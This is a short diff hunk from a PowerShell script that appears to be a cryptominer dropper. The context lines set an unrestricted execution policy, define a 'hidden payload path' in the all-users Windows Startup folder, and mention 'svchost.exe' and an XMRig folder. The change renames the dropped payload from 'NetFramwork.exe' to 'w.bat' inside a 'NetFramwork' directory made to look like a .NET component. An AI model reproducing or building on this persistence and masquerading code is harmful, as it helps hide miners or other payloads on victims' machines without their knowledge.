@@ -120,7 +120,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Define hidden payload path
 $hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 #$payloadName = "svchost.exe"
-$destinationPath = "$hiddenDir\NetFramwork\NetFramwork.exe"#Join-Path $hiddenDir $payloadName
+$destinationPath = "$hiddenDir\NetFramwork\w.bat"#Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 
 mkdir "$hiddenDir\NetFramwork"
